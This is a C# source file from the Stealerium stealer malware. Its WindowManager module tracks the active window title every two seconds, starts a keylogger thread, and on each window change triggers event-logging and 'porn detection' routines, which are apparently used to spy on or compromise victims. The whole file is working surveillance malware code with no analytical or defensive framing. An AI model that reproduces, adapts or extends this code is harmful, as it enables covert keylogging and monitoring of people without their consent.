using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Stealerium.Modules.Keylogger;

namespace Stealerium.Modules;

internal sealed class WindowManager
{
	public static string ActiveWindow;

	public static Thread MainThread = new Thread(Run);

	private static readonly List<Action> Functions = new List<Action>
	{
		EventManager.Action,
		PornDetection.Action
	};

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	private static string GetActiveWindowTitle()
	{
		try
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
			Process processById = Process.GetProcessById((int)lpdwProcessId);
			string text = processById.MainWindowTitle;
			if (string.IsNullOrWhiteSpace(text))
			{
				text = processById.ProcessName;
			}
			return text;
		}
		catch (Exception)
		{
			return "Unknown";
		}
	}

	private static void Run()
	{
		Stealerium.Modules.Keylogger.Keylogger.MainThread.Start();
		string text = "";
		while (true)
		{
			Thread.Sleep(2000);
			ActiveWindow = GetActiveWindowTitle();
			if (ActiveWindow == text)
			{
				continue;
			}
			text = ActiveWindow;
			foreach (Action function in Functions)
			{
				function();
			}
		}
	}
}
